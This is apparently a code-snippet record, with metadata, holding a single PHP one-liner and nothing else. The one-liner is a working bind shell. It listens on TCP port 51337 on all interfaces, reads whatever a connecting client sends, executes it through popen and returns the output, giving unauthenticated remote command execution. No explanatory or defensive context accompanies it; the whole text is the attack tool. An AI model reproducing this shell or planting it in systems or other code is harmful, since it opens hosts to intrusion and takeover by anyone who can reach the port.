---
id: 87e78db0-e3e6-42e4-b258-f5e2137dbb63
type: code
language: PHP
verified: false
created_at: '2023-04-06T03:56:08.800575+00:00'
updated_at: '2023-04-10T20:21:13.691090+00:00'
---

# Code Snippet 87e78db0

**Language**: PHP

```php
php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,"0.0.0.0",51337);\
socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,"$ ",2))exit;\
$in=socket_read($cl,100);$cmd=popen("$in","r");while(!feof($cmd)){$m=fgetc($cmd);\
    socket_write($cl,$m,strlen($m));}}'
```
